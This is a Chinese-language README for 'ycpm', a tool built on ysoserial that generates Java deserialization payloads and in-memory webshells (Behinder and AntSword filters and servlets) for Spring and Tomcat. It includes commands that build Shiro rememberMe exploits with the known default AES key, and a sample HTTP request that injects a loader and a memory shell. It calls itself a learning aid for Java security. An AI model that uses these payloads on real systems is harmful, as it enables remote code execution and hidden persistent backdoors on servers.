# 🌐 ycpm - Ysoserial Chain Process Model

**ycpm** 是一个用于构建和处理 Java 反序列化利用链的工具，支持动态编码、多级编排、反序列化内存马注入。  

该项目基于 [ysoserial](https://github.com/frohoff/ysoserial) 构建，它的主要功能是生成反序列化payload而不是直接攻击目标，所以并不适合红队人员或渗透测试人员。 它更适合在学习Java安全过程中快速生成你想要的反序列化payload。

有了编码器的加持，能够在不借助其他工具的情况下快速完成payload生成。

---

## ✨ 功能特性

- ✅ ysoserial payload
- ✅ encoder：base64、bcel、shiro
- ✅ 内存马loader：spring、tomcat
- ✅ 内存马shellcode：冰蝎[filter、servlet]、蚁剑[filter、servlet]

---

## 🚀 使用示例

### 1️⃣ 使用编码器

在ysoserial的基础上使用base64编码器

```bash
java -jar ycpm.jar "CommonsBeanutils1" "touch /tmp/success" "base64->print"
```

生成攻击shiro的payload（在反序列化链的基础上使用shiro格式编码器并指定密钥）

```bash
java -jar ycpm.jar "CommonsBeanutils1" "touch /tmp/success" "shiro:kPH+bIxk5D2deZiIxcaaaA==->print"
```


### 2️⃣ 生成Loader类型的内存马（shiro）

生成攻击shiro类型的loader

```bash
java -jar ycpm.jar "CommonsBeanutils1" "spring-loader:classdata" "shiro->print"
```

生成冰蝎类型内存马

```bash
java -jar ycpm.jar "MemShell" "bx-filter:Hello:/*:passwd" "base64->url->print"
```

构造HTTP包发送payload

```http request
POST /doLogin HTTP/1.1
Host: 192.168.137.132:8080
Cache-Control: max-age=0
Origin: your-ip:8080
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.137.132:8080/login;jsessionid=3F5E92A171B707DD38283016EEFF5CB1
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: rememberMe=[反序列化 shiro loader]
Connection: keep-alive

classdata=[反序列化 base64->url 内存马]
```

## 🧩 Encoder 编码器

一个支持链式指定调用的编码器。

如果链条的末尾未使用`file`、`print`的话，则会默认在链条的结尾调用`print`

### 当前支持的编码器列表

| 编码器名称 | 描述             | 示例                                       |
|------------|----------------|------------------------------------------|
| `base64`   | `Base64`格式转换   | `base64`                                 
| `shiro`    | `AES`+`Base64`格式转换 | `shiro`、`shiro:kPH+bIxk5D2deZiIxcaaaA==` |
| `BCEL`     | `$$BCEL$$`格式转换 | `bcel`                                   |
| `URL`      | `URL`          | `url`                                    |
| `File`     | 结果输出到文件        | `file`、`file:exploit.ser`                |
| `Print`    | 结果输出到终端        | `print`                                  |

## 🧩 内存马加载器(Loader)

| 内存马加载器          | 描述                                                | 示例                        |
|-----------------|---------------------------------------------------|---------------------------|
| `spring-loader` | Spring环境下从HTTP body中加载一个classdata参数作为内存马shellcode | `spring-loader:classdata` 
| `tomcat-loader` | Tomcat环境下从HTTP body中加载一个classdata参数作为内存马shellcode | `tomcat-loader:classdata` |

## 🧩 内存马(shellcode)

| 内存马类型                            | 描述                                   | 示例                        |
|----------------------------------|--------------------------------------|---------------------------|
| `bx-filter`                      | 冰蝎Filter内存马：拦截路径为/*、密码为`passwd`      | `bx-filter:Hello:/*:passwd` 
| `bx-servlet`                     | 冰蝎Servlet内存马：拦截路径为/shell、密码为`passwd` | `bx-servlet:Hello:/shell:passwd` |
| `yj-filter`                      | 蚁剑Filter内存马：拦截路径为/*、密码为`passwd`      | `yj-filter:Hello:/*:passwd` |
| `yj-servlet`                     | 蚁剑Servlet内存马：拦截路径为/shell、密码为`passwd` | `yj-servlet:Hello:/shell:passwd` |

## 🙏 致谢

该项目参考了以下相关内容，在此表示感谢！

- [frohoff/ysoserial](https://github.com/frohoff/ysoserial)
- [AntSwordProject/AwesomeScript](https://github.com/AntSwordProject/AwesomeScript)
- [rebeyond/Behinder](https://github.com/rebeyond/Behinder)